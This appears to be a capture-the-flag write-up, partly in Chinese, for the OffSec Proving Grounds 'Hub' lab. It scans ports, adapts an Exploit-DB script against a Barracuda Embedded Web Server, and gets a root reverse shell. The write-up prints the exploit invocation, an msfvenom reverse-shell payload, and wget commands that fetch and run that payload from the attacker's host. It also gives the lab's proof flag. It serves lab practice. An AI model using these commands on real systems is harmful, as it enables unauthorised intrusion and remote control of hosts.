###### tags: `Offsec` `PG Practice` `Easy` `Linux`

# Hub
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.204.25 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.204.25:22
Open 192.168.204.25:80
Open 192.168.204.25:8082
Open 192.168.204.25:9999

PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http     syn-ack nginx 1.18.0
8082/tcp open  http     syn-ack Barracuda Embedded Web Server
9999/tcp open  ssl/http syn-ack Barracuda Embedded Web Server
```

查看`192.168.204.25:8082`google搜尋到[edb-51550](https://www.exploit-db.com/exploits/51550)但要改的東西超多
```
# 51550.py
 82 r = s.post(f"http://{url}:8082/rtl/protected/wfslinks.lsp", data = data, verify = False ) # switching to https cause its easier to script lolz  
 99 r = s.get(f"http://{url}:8082/fs/")
126 r = s.post(f"http://{url}:8082/fs/", files=files)
130 r = s.get(f"http://{url}:8082/rev.lsp")
```

改完開nc，使用poc，得到的權限已經是root了，但因為這個shell很難用，再做一個shell出來比較好
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 51550.py -r 192.168.204.25 -rp 8082 -l 192.168.45.242 -p 9001

┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.242 LPORT=9005 -f elf > shell_9005

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9005

whoami
root
wget 192.168.45.242/shell_9005
chmod +x shell_9005
./shell_9005

python3 -c 'import pty; pty.spawn("/bin/bash")'
root@debian:/var/www/html#
```

在`/root`路徑可得proof.txt
```
root@debian:/root# cat proof.txt
f2c1ca0fee68f0087533d1b76fa6fe9c
```